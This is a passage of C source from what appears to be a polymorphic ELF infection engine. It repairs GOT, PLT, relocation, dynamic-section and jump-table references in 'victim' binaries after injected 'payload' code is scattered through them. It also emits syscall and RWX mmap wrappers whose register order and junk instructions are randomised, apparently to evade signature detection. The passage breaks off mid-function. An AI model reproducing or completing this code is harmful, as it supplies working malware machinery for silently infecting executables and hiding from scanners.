// Fix .got.plt contents: [0] = .dynamic addr, [3..N] = PLT[i]+6 for lazy binding.
// Also remap R_386_RELATIVE stored values in-place.
void fix_got_plt_contents(char* out, struct ElfInfo* ei, struct CodeNode* head) {
    int gotplt_off;
    int gotplt_sz;
    int gotplt_addr;
    int plt_addr;
    int plt_sz;
    int dynamic_addr;
    int i;
    int n_entries;
    int plt_entry_addr;
    int old_val;
    int new_val;

    gotplt_off = read_i32(ei->sec_offset, SI_GOTPLT * 4);
    gotplt_sz = read_i32(ei->sec_size, SI_GOTPLT * 4);
    gotplt_addr = read_i32(ei->sec_addr, SI_GOTPLT * 4);
    plt_addr = read_i32(ei->sec_addr, SI_PLT * 4);
    plt_sz = read_i32(ei->sec_size, SI_PLT * 4);
    dynamic_addr = read_i32(ei->sec_addr, SI_DYNAMIC * 4);

    if (gotplt_off == 0 || gotplt_sz == 0) { return; }

    // .got.plt[0] = .dynamic address
    write_i32(out, gotplt_off, dynamic_addr);
    // .got.plt[1] = 0 (link_map, filled by ld.so)
    write_i32(out, gotplt_off + 4, 0);
    // .got.plt[2] = 0 (resolver, filled by ld.so)
    write_i32(out, gotplt_off + 8, 0);

    // .got.plt[3..N] = PLT[1..N]+6 (lazy binding: point back to push insn)
    n_entries = (gotplt_sz - 12) / 4;
    i = 0;
    while (i < n_entries) {
        plt_entry_addr = plt_addr + 16 + i * 16 + 6;  // PLT[i+1] + 6
        write_i32(out, gotplt_off + 12 + i * 4, plt_entry_addr);
        i = i + 1;
    }
}

// Remap all R_386_RELATIVE stored values: read the value at each r_offset
// in the output, remap it via remap_va, write it back.
void fix_relative_values(char* out, struct ElfInfo* ei, struct CodeNode* head, int total_out) {
    int reldyn_off;
    int reldyn_sz;
    int num;
    int i;
    int r_offset;
    int r_info;
    int r_type;
    int new_r_offset;
    int file_pos;
    int si;
    int sa;
    int ss;
    int sf;
    int stored_val;
    int remapped;

    reldyn_off = read_i32(ei->sec_offset, SI_RELDYN * 4);
    reldyn_sz = read_i32(ei->sec_size, SI_RELDYN * 4);
    if (reldyn_off == 0 || reldyn_sz == 0) { return; }

    num = reldyn_sz / ELF_REL_SZ;
    i = 0;
    while (i < num) {
        r_info = read_i32(out, reldyn_off + i * ELF_REL_SZ + R_INFO_OFF);
        r_type = elf_r_type(r_info);

        if (r_type == R_386_RELATIVE) {
            // Read the new r_offset (already remapped by fix_rel_dyn)
            new_r_offset = read_i32(out, reldyn_off + i * ELF_REL_SZ + R_OFFSET_OFF);

            // Find file position of new_r_offset in output
            file_pos = -1;
            si = 0;
            while (si < SI_COUNT) {
                if (read_i32(ei->sec_shidx, si * 4) >= 0) {
                    sa = read_i32(ei->sec_addr, si * 4);
                    ss = read_i32(ei->sec_size, si * 4);
                    sf = read_i32(ei->sec_offset, si * 4);
                    if (sa > 0 && new_r_offset >= sa && new_r_offset < sa + ss) {
                        file_pos = sf + (new_r_offset - sa);
                        si = SI_COUNT;
                    }
                }
                si = si + 1;
            }

            if (file_pos >= 0 && file_pos + 4 <= total_out) {
                stored_val = read_i32(out, file_pos);
                // Remap any value that points into a section that moved
                remapped = remap_va(ei, head, stored_val);
                if (remapped != stored_val) {
                    write_i32(out, file_pos, remapped);
                }
            }
        }
        i = i + 1;
    }
}

// Fix CALL/JMP rel32 in non-.text sections (.init, .fini) that target .text,
// and fix PIC base ADD imm32 patterns (CALL thunk; ADD reg, imm32 → GOT base).
void fix_init_fini_calls(char* out, struct ElfInfo* ei, struct CodeNode* head) {
    int si_list[2];
    int n_sections;
    int i;
    int sec_off;
    int sec_sz;
    int sec_addr;
    int pos;
    int opcode;
    int old_disp;
    int old_target;
    int new_target;
    int new_disp;
    int old_gotplt;
    int new_gotplt;
    int k;
    int next_byte;
    int modrm;
    int old_imm;
    int ret_addr;
    int new_imm;

    new_gotplt = read_i32(ei->sec_addr, SI_GOTPLT * 4);
    k = read_i32(ei->sec_shidx, SI_GOTPLT * 4);
    if (k >= 0) {
        old_gotplt = read_i32(ei->data, ei->e_shoff + k * ELF_SHDR_SZ + SH_ADDR_OFF);
    } else {
        old_gotplt = 0;
    }

    si_list[0] = SI_INIT;
    si_list[1] = SI_FINI;
    n_sections = 2;

    i = 0;
    while (i < n_sections) {
        sec_off = read_i32(ei->sec_offset, si_list[i] * 4);
        sec_sz = read_i32(ei->sec_size, si_list[i] * 4);
        sec_addr = read_i32(ei->sec_addr, si_list[i] * 4);
        if (sec_off == 0 || sec_sz == 0) {
            i = i + 1;
            continue;
        }

        pos = 0;
        while (pos < sec_sz - 5) {
            opcode = out[sec_off + pos] & 0xFF;
            if (opcode == 0xE8 || opcode == 0xE9) {  // CALL or JMP rel32
                old_disp = read_i32(out, sec_off + pos + 1);
                old_target = sec_addr + pos + 5 + old_disp;
                // Fix CALL/JMP targeting old .text range
                if (old_target >= ei->text_addr && old_target < ei->text_addr + ei->text_size) {
                    new_target = remap_va(ei, head, old_target);
                    if (new_target != old_target) {
                        new_disp = new_target - (sec_addr + pos + 5);
                        write_i32(out, sec_off + pos + 1, new_disp);
                    }
                }
                // Also fix PIC GOT base: CALL thunk; ADD reg, imm32
                // where ret_addr + imm32 == old_gotplt
                // Two forms: 81 Cx imm32 (6 bytes) and 05 imm32 (ADD EAX, 5 bytes)
                if (opcode == 0xE8 && old_gotplt != 0) {
                    next_byte = out[sec_off + pos + 5] & 0xFF;
                    if (next_byte == 0x81 && pos + 5 + 6 <= sec_sz) {
                        modrm = out[sec_off + pos + 6] & 0xFF;
                        if (modrm >= 0xC0 && modrm <= 0xC7) {
                            old_imm = read_i32(out, sec_off + pos + 7);
                            ret_addr = sec_addr + pos + 5;
                            if (ret_addr + old_imm == old_gotplt) {
                                new_imm = new_gotplt - ret_addr;
                                write_i32(out, sec_off + pos + 7, new_imm);
                            }
                        }
                    }
                    if (next_byte == 0x05 && pos + 5 + 5 <= sec_sz) {  // ADD EAX, imm32
                        old_imm = read_i32(out, sec_off + pos + 6);
                        ret_addr = sec_addr + pos + 5;
                        if (ret_addr + old_imm == old_gotplt) {
                            new_imm = new_gotplt - ret_addr;
                            write_i32(out, sec_off + pos + 6, new_imm);
                        }
                    }
                }
            }
            pos = pos + 1;
        }
        i = i + 1;
    }
}

// Fix PIC GOT-base thunks using FL_GOTPTR flags (set by detect_pic_thunks_on_nodes).
void fix_pic_thunks_from_nodes(char* out, struct ElfInfo* ei, struct CodeNode* head) {
    struct CodeNode* c;
    int new_gotplt;
    int text_off;
    int ret_addr;
    int new_imm;
    int count;

    new_gotplt = read_i32(ei->sec_addr, SI_GOTPLT * 4);
    text_off = read_i32(ei->sec_offset, SI_TEXT * 4);
    count = 0;

    c = head;
    while (c != 0) {
        if ((c->flags & FL_GOTPTR) != 0 && (c->flags & FL_ME) == 0) {
            // This is an ADD node; the preceding CALL is c->prev
            if (c->prev != 0 && (c->prev->src[0] & 0xFF) == 232 && c->prev->len == 5) {
                int ioff;
                ret_addr = c->prev->newrva + 5;
                new_imm = new_gotplt - ret_addr;
                // 81 Cx imm32 (6 bytes): imm at offset 2
                // 05 imm32 (5 bytes, ADD EAX short): imm at offset 1
                ioff = 2;
                if ((c->src[0] & 0xFF) == 5 && c->len == 5) { ioff = 1; }
                write_i32(out, text_off + c->newofs + ioff, new_imm);
                count = count + 1;
            }
        }
        c = c->next;
    }
    if (count > 0) {
        print("  Fixed ");
        print_int(count);
        print(" victim PIC thunks (node-based)\n");
    }
}

// Fix PIC-relative references to .text in victim code.
// Victim instructions use [pic_base_reg + disp32] to compute .text addresses
// (function pointers, jump targets via LEA, etc). After scatter, .text functions
// moved but the disp32 is baked in as (target - old_gotplt). Recompute as
// (new_target - new_gotplt).
// Tracks PIC base register per function from FL_GOTPTR nodes.
void fix_pic_text_refs(char* out, struct ElfInfo* ei, struct CodeNode* head) {
    struct CodeNode* c;
    int pic_reg;
    int new_gotplt;
    int old_gotplt;
    int text_off;
    int count;
    int k_gp;

    new_gotplt = read_i32(ei->sec_addr, SI_GOTPLT * 4);
    k_gp = read_i32(ei->sec_shidx, SI_GOTPLT * 4);
    if (k_gp < 0) { return; }
    old_gotplt = read_i32(ei->data, ei->e_shoff + k_gp * ELF_SHDR_SZ + SH_ADDR_OFF);
    text_off = read_i32(ei->sec_offset, SI_TEXT * 4);
    count = 0;
    pic_reg = -1;

    c = head;
    while (c != 0) {
        // Track PIC base register from FL_GOTPTR nodes (victim only)
        if ((c->flags & FL_GOTPTR) != 0 && (c->flags & FL_ME) == 0) {
            int aop;
            aop = c->src[0] & 0xFF;
            if (aop == 129) {
                pic_reg = (c->src[1] & 0xFF) - 192;
            } else if (aop == 5) {
                pic_reg = 0;
            }
        }

        // Scan victim nodes for [pic_reg + disp32] targeting .text
        if (pic_reg >= 0 && (c->flags & FL_ME) == 0 && (c->flags & FL_GOTPTR) == 0
            && c->len >= 3 && c->newofs >= 0 && c->src != 0) {
            int p;
            int b;
            int modrm_pos;
            int modrm;
            int mod_field;
            int rm_field;
            int disp_pos;
            int old_disp;
            int old_target;
            int new_target;
            int new_disp;

            // Skip prefixes
            p = 0;
            while (p < c->len - 5) {
                b = c->src[p] & 0xFF;
                if (b == 102 || b == 103 || b == 242 || b == 243 ||
                    b == 46 || b == 62 || b == 38 || b == 54 ||
                    b == 100 || b == 101) {
                    p = p + 1;
                } else {
                    break;
                }
            }
            // Skip opcode (1 or 2 bytes)
            if (p < c->len && (c->src[p] & 0xFF) == 15) {
                modrm_pos = p + 2;  // 0F xx modrm
            } else {
                modrm_pos = p + 1;  // xx modrm
            }
            // Check ModRM byte
            if (modrm_pos < c->len - 4) {
                modrm = c->src[modrm_pos] & 0xFF;
                mod_field = (modrm >> 6) & 3;
                rm_field = modrm & 7;
                if (mod_field == 2 && rm_field == pic_reg && rm_field != 4) {
                    disp_pos = modrm_pos + 1;
                    old_disp = read_i32(c->src, disp_pos);
                    old_target = old_gotplt + old_disp;
                    if (old_target >= ei->text_addr &&
                        old_target < ei->text_addr + ei->text_size) {
                        new_target = remap_va(ei, head, old_target);
                        new_disp = new_target - new_gotplt;
                        if (new_disp != old_disp) {
                            write_i32(out, text_off + c->newofs + disp_pos, new_disp);
                            count = count + 1;
                        }
                    }
                }
            }
        }
        c = c->next;
    }
    if (count > 0) {
        print("  Fixed ");
        print_int(count);
        print(" PIC .text refs (LEA/MOV/etc)\n");
    }
}

// Fix .rodata jump table entries (switch statements).
// GCC compiles switch to: load entry from [pic_base + index*4 + table_off],
// add pic_base, jmp. Entries are (target - old_gotplt). After scatter/append,
// .text targets moved but entries still reference old positions.
// Identifies tables as contiguous runs of 2+ entries resolving to .text
// (isolated hits are false positives from string data).
void fix_rodata_jump_tables(char* out, struct ElfInfo* ei, struct CodeNode* head) {
    int rodata_off;
    int rodata_sz;
    int old_gotplt;
    int new_gotplt;
    int k_gp;
    int pos;
    int entry;
    int old_target;
    int run_start;
    int run_len;
    int count;
    int i;

    rodata_off = read_i32(ei->sec_offset, SI_RODATA * 4);
    rodata_sz = read_i32(ei->sec_size, SI_RODATA * 4);
    if (rodata_off == 0 || rodata_sz == 0) { return; }

    new_gotplt = read_i32(ei->sec_addr, SI_GOTPLT * 4);
    k_gp = read_i32(ei->sec_shidx, SI_GOTPLT * 4);
    if (k_gp < 0) { return; }
    old_gotplt = read_i32(ei->data, ei->e_shoff + k_gp * ELF_SHDR_SZ + SH_ADDR_OFF);

    // Two-pass: find contiguous runs of .text-targeting entries, then fix them.
    count = 0;
    pos = 0;
    while (pos + 4 <= rodata_sz) {
        entry = read_i32(out, rodata_off + pos);
        old_target = old_gotplt + entry;
        if (old_target >= ei->text_addr &&
            old_target < ei->text_addr + ei->text_size) {
            // Start of potential run
            run_start = pos;
            run_len = 1;
            while (pos + 8 <= rodata_sz) {
                pos = pos + 4;
                entry = read_i32(out, rodata_off + pos);
                old_target = old_gotplt + entry;
                if (old_target >= ei->text_addr &&
                    old_target < ei->text_addr + ei->text_size) {
                    run_len = run_len + 1;
                } else {
                    break;
                }
            }
            // Only fix runs of 2+ entries (single hits are likely false positives)
            if (run_len >= 2) {
                i = 0;
                while (i < run_len) {
                    int fix_pos;
                    int new_entry;
                    int new_target;
                    fix_pos = run_start + i * 4;
                    entry = read_i32(out, rodata_off + fix_pos);
                    old_target = old_gotplt + entry;
                    {
                        struct CodeNode* tgt;
                        tgt = find_node_exact(head, old_target);
                        if (tgt != 0) {
                            new_target = tgt->newrva;
                            new_entry = new_target - new_gotplt;
                            if (new_entry != entry) {
                                write_i32(out, rodata_off + fix_pos, new_entry);
                                count = count + 1;
                            }
                        }
                    }
                    i = i + 1;
                }
            }
        }
        pos = pos + 4;
    }
    if (count > 0) {
        print("  Fixed ");
        print_int(count);
        print(" .rodata jump table entries\n");
    }
}

// Fix .rel.plt entries: update r_offset for .got.plt entries that moved
void fix_rel_plt(char* out, struct ElfInfo* ei) {
    int relplt_off;
    int relplt_sz;
    int gotplt_addr;
    int old_gotplt_addr;
    int num;
    int i;
    int r_offset;
    int delta;
    int old_gotplt_shoff;

    relplt_off = read_i32(ei->sec_offset, SI_RELPLT * 4);
    relplt_sz = read_i32(ei->sec_size, SI_RELPLT * 4);
    if (relplt_off == 0 || relplt_sz == 0) { return; }

    // Compute .got.plt VA shift
    gotplt_addr = read_i32(ei->sec_addr, SI_GOTPLT * 4);
    // Original .got.plt address from section header
    {
        int k;
        k = read_i32(ei->sec_shidx, SI_GOTPLT * 4);
        if (k >= 0) {
            old_gotplt_addr = read_i32(ei->data, ei->e_shoff + k * ELF_SHDR_SZ + SH_ADDR_OFF);
        } else {
            return;
        }
    }
    delta = gotplt_addr - old_gotplt_addr;

    // Update each .rel.plt entry's r_offset by the .got.plt VA shift
    num = relplt_sz / ELF_REL_SZ;
    i = 0;
    while (i < num) {
        r_offset = read_i32(out, relplt_off + i * ELF_REL_SZ + R_OFFSET_OFF);
        if (r_offset >= old_gotplt_addr && r_offset < old_gotplt_addr + 4096) {
            write_i32(out, relplt_off + i * ELF_REL_SZ + R_OFFSET_OFF, r_offset + delta);
        }
        i = i + 1;
    }
}

// Fix .dynamic section: update DT_* tag values for sections that moved
void fix_dynamic(char* out, struct ElfInfo* ei) {
    int dyn_file_off;
    int dyn_size;
    int num_entries;
    int i;
    int d_tag;
    int d_val;
    int off;

    dyn_size = read_i32(ei->sec_size, SI_DYNAMIC * 4);
    dyn_file_off = read_i32(ei->sec_offset, SI_DYNAMIC * 4);

    num_entries = dyn_size / ELF_DYN_SZ;
    i = 0;
    while (i < num_entries) {
        off = dyn_file_off + i * ELF_DYN_SZ;
        d_tag = read_i32(out, off + D_TAG_OFF);
        if (d_tag == DT_NULL) { break; }

        // Update address tags to use new section addresses from build_elf
        if (d_tag == DT_PLTGOT) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_GOTPLT * 4)); }
        if (d_tag == DT_HASH)   { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_HASH * 4)); }
        if (d_tag == DT_STRTAB) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_DYNSTR * 4)); }
        if (d_tag == DT_SYMTAB) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_DYNSYM * 4)); }
        if (d_tag == DT_JMPREL) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_RELPLT * 4)); }
        if (d_tag == DT_REL)    { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_RELDYN * 4)); }
        if (d_tag == DT_INIT)   { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_INIT * 4)); }
        if (d_tag == DT_FINI)   { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_FINI * 4)); }
        if (d_tag == DT_INIT_ARRAY) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_CTOR * 4)); }
        if (d_tag == DT_FINI_ARRAY) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_addr, SI_FINI_ARRAY * 4)); }
        if (d_tag == DT_FINI_ARRAYSZ) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_size, SI_FINI_ARRAY * 4)); }
        // Zero out version tags to avoid .gnu.version_r corruption issues.
        // The dynamic linker falls back to unversioned symbol lookup.
        if (d_tag == DT_VERSYM) {
            write_i32(out, off + D_TAG_OFF, DT_NULL);
            write_i32(out, off + D_VAL_OFF, 0);
        }
        if (d_tag == DT_VERNEED) {
            write_i32(out, off + D_TAG_OFF, DT_NULL);
            write_i32(out, off + D_VAL_OFF, 0);
        }
        if (d_tag == DT_VERNEEDNUM) {
            write_i32(out, off + D_TAG_OFF, DT_NULL);
            write_i32(out, off + D_VAL_OFF, 0);
        }
        // Update size tags
        if (d_tag == DT_STRSZ)    { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_size, SI_DYNSTR * 4)); }
        if (d_tag == DT_RELSZ)    { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_size, SI_RELDYN * 4)); }
        if (d_tag == DT_PLTRELSZ) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_size, SI_RELPLT * 4)); }
        if (d_tag == DT_INIT_ARRAYSZ) { write_i32(out, off + D_VAL_OFF, read_i32(ei->sec_size, SI_CTOR * 4)); }

        i = i + 1;
    }
}

// Fix .dynsym: update st_value for symbols whose addresses changed
void fix_dynsym(char* out, struct ElfInfo* ei, struct CodeNode* head) {
    int dynsym_file_off;
    int dynsym_size;
    int num_syms;
    int i;
    int off;
    int st_value;
    int st_info;
    int st_type;
    struct CodeNode* t;

    dynsym_size = read_i32(ei->sec_size, SI_DYNSYM * 4);
    dynsym_file_off = read_i32(ei->sec_offset, SI_DYNSYM * 4);

    num_syms = dynsym_size / ELF_SYM_SZ;
    i = 0;
    while (i < num_syms) {
        off = dynsym_file_off + i * ELF_SYM_SZ;
        st_value = read_i32(out, off + ST_VALUE_OFF);
        st_info = read_u8(out, off + ST_INFO_OFF);
        st_type = elf_st_type(st_info);

        if (st_value != 0) {
            // Symbol in .text? Look up in chain.
            if (st_value >= ei->text_addr && st_value < ei->text_addr + ei->text_size) {
                t = find_node_by_oldrva(head, st_value);
                if (t != 0) {
                    write_i32(out, off + ST_VALUE_OFF, t->newrva);
                }
            }
            // Non-.text symbols: their addresses are in sections that
            // build_elf already wrote correctly. Leave as-is for now —
            // the dynamic linker handles PIE relocation at load time.
        }
        i = i + 1;
    }
}

// Fix abs-mode payload extern fixups: for each FL_ME node with iat_fixup entries,
// write the address of the corresponding PLT entry.
// plt_slots: array where plt_slots[api_slot] = PLT entry VA for that API slot
void fix_scatter_extern_refs(char* out, int text_file_off, struct CodeNode* head,
                             int* plt_slots, int n_plt_slots) {
    struct CodeNode* c;
    int i;
    int fix_off;
    int slot_idx;
    int plt_addr;
    int call_disp;

    c = head;
    while (c != 0) {
        if ((c->flags & FL_ME) != 0 && c->n_iat_fixups > 0) {
            i = 0;
            while (i < c->n_iat_fixups) {
                fix_off = c->iat_fixup_rel[i];
                slot_idx = c->iat_fixup_idx[i];
                if (slot_idx >= 0 && slot_idx < n_plt_slots) {
                    plt_addr = plt_slots[slot_idx];
                    // The fixup is a CALL rel32 — displacement from after the CALL instruction
                    // fix_off points to the start of the 4-byte displacement
                    call_disp = plt_addr - (c->newrva + fix_off + 4);
                    write_i32(out, text_file_off + c->newofs + fix_off, call_disp);
                }
                i = i + 1;
            }
        }
        c = c->next;
    }
}

// Fix PIC data thunks in payload code after scatter.
// Pattern: CALL $+0 (E8 00 00 00 00); POP reg (58-5F); ADD reg, imm32 (81 C0+reg xx xx xx xx)
// In the .bin layout the imm32 is (code_size - pop_offset + data_offset).
// After scatter, data lives at scatter_data_va and code positions have shifted.
// Recompute: new_imm = scatter_data_va + data_section_offset - new_pop_pc
void fix_scatter_pic_thunks(char* out, int text_file_off, struct CodeNode* head,
                            int code_size, int scatter_data_va) {
    struct CodeNode* c;
    int b0;
    int b1;
    int b2;
    int modrm_byte;
    int old_imm;
    int pop_code_offset;
    int data_section_offset;
    int new_pop_pc;
    int new_imm;
    int off;
    int count;

    count = 0;
    c = head;
    while (c != 0) {
        // Only payload nodes (FL_ME)
        if ((c->flags & FL_ME) != 0 && c->len == 5 && c->src != 0) {
            b0 = c->src[0] & 0xFF;
            if (b0 == 232) {  // 0xE8 = CALL
                // Check if CALL $+0 (next 4 bytes are zero)
                if ((c->src[1] & 0xFF) == 0 && (c->src[2] & 0xFF) == 0 &&
                    (c->src[3] & 0xFF) == 0 && (c->src[4] & 0xFF) == 0) {
                    // Check next node: POP reg (58-5F), must also be FL_ME
                    if (c->next != 0 && c->next->len == 1 && (c->next->flags & FL_ME) != 0) {
                        b1 = c->next->src[0] & 0xFF;
                        if (b1 >= 88 && b1 <= 95) {  // 0x58-0x5F
                            // Check next: ADD reg, imm32 (81 C0+reg), must also be FL_ME
                            if (c->next->next != 0 && c->next->next->len == 6
                                && (c->next->next->flags & FL_ME) != 0) {
                                b2 = c->next->next->src[0] & 0xFF;
                                if (b2 == 129) {  // 0x81
                                    modrm_byte = c->next->next->src[1] & 0xFF;
                                    if (modrm_byte >= 192 && modrm_byte <= 199) {  // C0-C7 = ADD
                                        // Found payload PIC thunk
                                        old_imm = read_i32(c->next->next->src, 2);
                                        // pop_code_offset = position of POP in original code
                                        pop_code_offset = c->oldrva + 5;
                                        // Recover data_section_offset from original displacement
                                        data_section_offset = old_imm - code_size + pop_code_offset;
                                        // New POP PC = VA after CALL $+0
                                        new_pop_pc = c->newrva + 5;
                                        // New displacement
                                        new_imm = scatter_data_va + data_section_offset - new_pop_pc;
                                        // Patch in output
                                        off = text_file_off + c->next->next->newofs + 2;
                                        write_i32(out, off, new_imm);
                                        count = count + 1;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        c = c->next;
    }
    if (count > 0) {
        print("  Fixed ");
        print_int(count);
        print(" payload PIC thunks\n");
    }
}

// =============================================================================
//
// Symbol/Import & Syscall Wrappers Module
//
// Syscall and libc-style malloc/calloc/free wrapper builders that populate
// the engine's API table.
//
// =============================================================================

// Get Linux x86 syscall number for a function name.
// Returns -1 if not a known syscall.
int get_syscall_nr(char* name) {
    if (str_eq(name, "read") != 0)    { return 3; }
    if (str_eq(name, "write") != 0)   { return 4; }
    if (str_eq(name, "open") != 0)    { return 5; }
    if (str_eq(name, "close") != 0)   { return 6; }
    if (str_eq(name, "exit") != 0)    { return 1; }
    if (str_eq(name, "getpid") != 0)  { return 20; }
    if (str_eq(name, "getuid") != 0)  { return 24; }
    if (str_eq(name, "getppid") != 0) { return 64; }
    if (str_eq(name, "getgid") != 0)  { return 47; }
    if (str_eq(name, "geteuid") != 0) { return 49; }
    if (str_eq(name, "getegid") != 0) { return 50; }
    if (str_eq(name, "getpgrp") != 0) { return 65; }
    if (str_eq(name, "clock") != 0)   { return 43; } // SYS_times
    return -1;
}

// Get number of cdecl arguments for a syscall wrapper.
int get_syscall_nargs(int nr) {
    if (nr == 1) { return 1; }   // exit(code)
    if (nr == 3) { return 3; }   // read(fd, buf, n)
    if (nr == 4) { return 3; }   // write(fd, buf, n)
    if (nr == 5) { return 2; }   // open(path, flags)
    if (nr == 6) { return 1; }   // close(fd)
    if (nr == 43) { return 0; }  // clock → times(NULL)
    return 0;  // getpid, getuid, etc.
}

// Build a syscall wrapper CodeNode: cdecl wrapper around INT 0x80.
// Polymorphic dimensions:
//   - PUSH EBX vs poly_load_imm EAX: independent, randomized order
//   - Argument-load order: 1/2/6 permutations for n=1/2/3 (independent loads)
//   - Strict-safe junk slots between independent ops (flags-only / live-restored)
// Mandatory invariants (kernel ABI / cdecl):
//   - EAX = syscall_nr at INT 0x80
//   - EBX/ECX/EDX = arg 1/2/3 (kernel reads specific regs)
//   - EBX preserved across call (PUSH/POP envelope)
struct CodeNode* make_syscall_wrapper(int syscall_nr, int n_args) {
    struct CodeNode* c;
    char* s;
    int p;
    int order[3];
    int regs[3];   // ModR/M middle byte for MOV r,[ESP+disp]
    int disps[3];  // disp8 to reach arg 1/2/3 with PUSH EBX accounted for
    int i; int j; int t;
    int push_first;

    s = malloc(256);  // worst case ~208B with 5 strict-junk slots
    p = 0;

    regs[0] = 0x5C; disps[0] = 0x08;  // MOV EBX, [ESP+8]   — arg 1
    regs[1] = 0x4C; disps[1] = 0x0C;  // MOV ECX, [ESP+12]  — arg 2
    regs[2] = 0x54; disps[2] = 0x10;  // MOV EDX, [ESP+16]  — arg 3

    // PUSH EBX ⟂ poly_load_imm EAX (EAX load doesn't touch stack, so disp
    // values 8/12/16 are correct regardless of which comes first).
    push_first = prng_range(2);
    if (push_first != 0) {
        s[p] = 0x53; p = p + 1;             // PUSH EBX
        p = poly_junk(s, p, -2);
        p = poly_load_imm(s, p, 0, syscall_nr);
    } else {
        p = poly_load_imm(s, p, 0, syscall_nr);
        p = poly_junk(s, p, -2);
        s[p] = 0x53; p = p + 1;             // PUSH EBX
    }

    if (n_args == 0) {
        // 0-arg syscalls (getpid/getuid/times-NULL) don't read EBX, but
        // zero it defensively. Strict junk before/after.
        p = poly_junk(s, p, -2);
        p = poly_zero_reg(s, p, 3);
    } else {
        // Identity order, then Fisher-Yates shuffle.
        i = 0;
        while (i < n_args) { order[i] = i; i = i + 1; }
        i = 0;
        while (i < n_args) {
            j = i + prng_range(n_args - i);
            t = order[i]; order[i] = order[j]; order[j] = t;
            i = i + 1;
        }
        // Emit MOV r, [ESP+disp] in shuffled order, strict junk before each
        // and one final slot after the last load.
        i = 0;
        while (i < n_args) {
            p = poly_junk(s, p, -2);
            t = order[i];
            s[p] = 0x8B; p = p + 1;
            s[p] = regs[t]; p = p + 1;
            s[p] = 0x24; p = p + 1;
            s[p] = disps[t]; p = p + 1;
            i = i + 1;
        }
        p = poly_junk(s, p, -2);
    }

    // INT 0x80
    s[p] = 0xCD; p = p + 1;
    s[p] = 0x80; p = p + 1;

    // POP EBX
    s[p] = 0x5B; p = p + 1;

    // RET
    s[p] = 0xC3; p = p + 1;

    c = new_code_node();
    c->src = s;
    c->len = p;
    c->flags = FL_ME | FL_FREESRC | FL_STOP;
    c->oldrva = -3;
    return c;
}

// Build a dummy wrapper (returns 0) for unresolvable externs.
struct CodeNode* make_dummy_wrapper() {
    struct CodeNode* c;
    char* s;
    int p;
    s = malloc(12);                     // poly_zero_reg max 7B + RET 1B
    p = 0;
    p = poly_zero_reg(s, p, 0);         // EAX = 0 (polymorphic)
    s[p] = 0xC3; p = p + 1;             // RET
    c = new_code_node();
    c->src = s;
    c->len = p;
    c->flags = FL_ME | FL_FREESRC | FL_STOP;
    c->oldrva = -3;
    return c;
}

// Build a malloc wrapper using SYS_mmap2 (anonymous private RWX mapping).
// Doesn't conflict with libc's brk-based heap — safe to call before libc init.
// RWX so allocated memory can hold executable code (e.g. load_and_run_bin).
// malloc(size): mmap2(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
//
// Polymorphic dimensions: PUSH order shuffled (4 regs = 24 perms), 6 independent
// imm loads permuted (6! = 720 perms), strict-safe junk slots between ops.
struct CodeNode* make_malloc_wrapper() {
    struct CodeNode* c;
    char* s;
    int p;
    int saved[4]; int save_order[4];
    int load_regs[6]; int load_vals[6]; int load_zero[6]; int load_order[6];
    int i; int j; int t;

    s = malloc(384);  // ~345B worst case (PUSH/composite/6 loads/7 junk slots/INT/POP/RET)
    p = 0;

    // Save callee-saved regs in randomized order.
    saved[0] = 3;   // EBX
    saved[1] = 5;   // EBP
    saved[2] = 6;   // ESI
    saved[3] = 7;   // EDI
    p = emit_save_regs_specific(s, p, saved, 4, save_order);

    // Composite: ECX = page-round([ESP+20]).
    // After 4 PUSHes (16B) + ret addr (4B) = arg 1 at [ESP+20].
    // ESP stable from here to INT 0x80 (no further pushes/pops).
    p = poly_junk(s, p, -2);
    s[p] = 0x8B; p = p + 1; s[p] = 0x4C; p = p + 1; s[p] = 0x24; p = p + 1; s[p] = 20; p = p + 1;
    s[p] = 0x81; p = p + 1; s[p] = 0xC1; p = p + 1; s[p] = 0xFF; p = p + 1; s[p] = 0x0F; p = p + 1; s[p] = 0; p = p + 1; s[p] = 0; p = p + 1;
    s[p] = 0x81; p = p + 1; s[p] = 0xE1; p = p + 1; s[p] = 0; p = p + 1; s[p] = 0xF0; p = p + 1; s[p] = 0xFF; p = p + 1; s[p] = 0xFF; p = p + 1;

    // Independent imm loads — permute order, strict junk between.
    load_regs[0] = 0; load_vals[0] = 192;   load_zero[0] = 0;  // EAX = 192 (SYS_mmap2)
    load_regs[1] = 3; load_vals[1] = 0;     load_zero[1] = 1;  // EBX = NULL (addr)
    load_regs[2] = 2; load_vals[2] = 7;     load_zero[2] = 0;  // EDX = PROT_RWX
    load_regs[3] = 6; load_vals[3] = 0x22;  load_zero[3] = 0;  // ESI = MAP_PRIVATE|ANON
    load_regs[4] = 7; load_vals[4] = -1;    load_zero[4] = 0;  // EDI = -1 (fd)
    load_regs[5] = 5; load_vals[5] = 0;     load_zero[5] = 1;  // EBP = 0 (offset)

    i = 0;
    while (i < 6) { load_order[i] = i; i = i + 1; }
    i = 0;
    while (i < 6) {
        j = i + prng_range(6 - i);
        t = load_order[i]; load_order[i] = load_order[j]; load_order[j] = t;
        i = i + 1;
    }
    i = 0;
    while (i < 6) {
        p = poly_junk(s, p, -2);
        t = load_order[i];
        if (load_zero[t] != 0) {
            p = poly_zero_reg(s, p, load_regs[t]);
        } else {
            p = poly_load_imm(s, p, load_regs[t], load_vals[t]);
        }
        i = i + 1;
    }
    p = poly_junk(s, p, -2);

    // INT 0x80
    s[p] = 0xCD; p = p + 1;
    s[p] = 0x80; p = p + 1;

    // Restore in reverse order, then RET.
    p = emit_restore_regs(s, p, save_order, 4);
